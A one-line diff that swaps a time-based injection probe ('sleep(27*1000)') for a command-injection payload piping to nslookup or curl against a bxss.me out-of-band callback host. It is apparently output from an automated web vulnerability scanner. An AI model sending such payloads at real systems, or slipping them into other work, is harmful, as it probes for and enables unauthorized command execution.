@@ -1,1 +1,1 @@
-555"||sleep(27*1000)*jzmffk||"
+|(nslookup -q=cname hitymauxzkwsy7b470.bxss.me||curl hitymauxzkwsy7b470.bxss.me)
